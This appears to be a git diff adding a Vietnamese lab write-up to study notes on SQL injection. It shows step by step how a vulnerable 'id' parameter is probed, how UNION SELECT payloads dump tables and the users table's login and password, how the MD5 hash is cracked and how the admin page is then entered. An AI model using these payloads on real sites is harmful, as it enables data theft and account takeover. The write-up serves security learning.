@@ -63,6 +63,73 @@ Có 3 bảng cần chú ý: <code>COLUMNS, TABLES, USER_PRIVILEGES</code>
 
 ## 2. Report lab <a name="id2" />
 
+- Vào trang web thì thấy menu 
+<img src="https://user-images.githubusercontent.com/61901474/163403294-afd8027f-f142-486a-8894-a3b867f6f979.png" alt="..." width="700" />
+
+- Bấm thử qua các lựa chọn, thì tại "test" xuất hiện như sau:
+<img src="https://user-images.githubusercontent.com/61901474/163403839-66c27933-a314-45f6-bd30-d7f9bd5ce47c.png" alt="..." width="700" />
+
+- Nhận thấy đường dẫn xuất hiện <code>?id=1</code> -> thử nhập thêm dấu ' phía trước 1 và xem kết quả 
+<img src="https://user-images.githubusercontent.com/61901474/163407787-c34f7d56-58e7-4feb-b25c-ba9d00bd031c.png" alt="..." width="700" />
+
+-> có thể khai thác lỗ hổng từ trang này
+
+- Sử dụng <code>ORDER BY</code> để xem số lượng cột của database, sau các lần thử, số cột là 4
+
+<img src="https://user-images.githubusercontent.com/61901474/163411721-0fced203-78a7-4c36-8238-1c0ba2d698e8.png" alt="..." width="700" />
+
+<img src="https://user-images.githubusercontent.com/61901474/163411752-27835567-8ed7-4ca4-abf0-abdd483a52cc.png" alt="..." width="700" />
+
+- Thử thêm vào sau url <code>UNION SELECT 1,2,3,4</code>
+
+<img src="https://user-images.githubusercontent.com/61901474/163412223-daf10503-1025-4aca-bceb-fec7a767afeb.png" alt="..." width="700" />
+
+-> cột số 2 là cột có thể injection
+
+- Có thể thử bằng hàm current_user() để kiểm tra:
+
+<img src="https://user-images.githubusercontent.com/61901474/163412545-e6fa5a37-2d7b-4b8f-8117-cee0c45cd161.png" alt="..." width="700" />
+
+- Đọc dữ liệu của database infomation_schema để xem có các bảng nào trong database:
+```SQL
+UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema=database()
+```
+
+<img src="https://user-images.githubusercontent.com/61901474/163413284-3fb305b3-ac19-49cc-b317-c28a0b3aea52.png" alt="..." width="700" />
+
+-> có 3 bảng: categories, pictures và users -> khai thác bảng users
+
+- Tiếp tục kiểm tra các cột của bảng users, dùng:
+```SQL
+UNION SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_name='users'
+```
+
+<img src="https://user-images.githubusercontent.com/61901474/163414117-dae16e0b-7db7-4e46-b837-0245cd02f3fb.png" alt="..." width="700" />
+
+-> gồm 3 cột: id, login và password
+
+- Sử dụng câu truy vấn để lấy thông tin login và password của bảng users:
+```sql
+UNION SELECT 1, concat(login,':',password), 3, 4 FROM users
+```
+
+![image](https://user-images.githubusercontent.com/61901474/163414602-1734f31a-d868-46ab-81c1-2a5c9735c855.png)
+
+-> tên đăng nhập là admin, password đang được mã hóa -> thử dùng MD5 để giải mã 
+![image](https://user-images.githubusercontent.com/61901474/163414964-b2d33b9c-4075-41b5-a927-54af07a1deca.png)
+
+-> password là: P4ssw0rd
+
+- Sang trang admin để đăng nhập
+![image](https://user-images.githubusercontent.com/61901474/163415056-b7a675cb-00de-44df-b0f1-5350891197c4.png)
+
+Đăng nhập thành công, lúc này có thể thực hiện các thao tác thêm, xóa, sửa,... trong database
+
+ ** Giải thích một số hàm/lệnh sử dụng
+  - UNION: dùng để ghép các truy vấn lại với nhau
+  - ORDER BY: sắp xếp dữ liệu theo cột
+  - concat(): hàm dùng để nối các chuỗi
+
 ## 3. SQL injection là gì? <a name="id3" />
 
 - SQL injection là gì? SQL injection là một kỹ thuật cho phép những kẻ tấn công lợi dụng lỗ hổng của việc kiểm tra dữ liệu đầu vào trong các ứng dụng web và các thông báo lỗi của hệ quản trị cơ sở dữ liệu trả về để inject (tiêm vào) và thi hành các câu lệnh SQL bất hợp pháp. SQL injection có thể cho phép những kẻ tấn công thực hiện các thao tác, delete, insert, update, v.v. trên cơ sở dữ liệu của ứng dụng, thậm chí là server mà ứng dụng đó đang chạy. SQL injection thường được biết đến như là một vật trung gian tấn công trên các ứng dụng web có dữ liệu được quản lý bằng các hệ quản trị cơ sở dữ liệu như SQL Server, MySQL, Oracle, DB2, Sysbase...
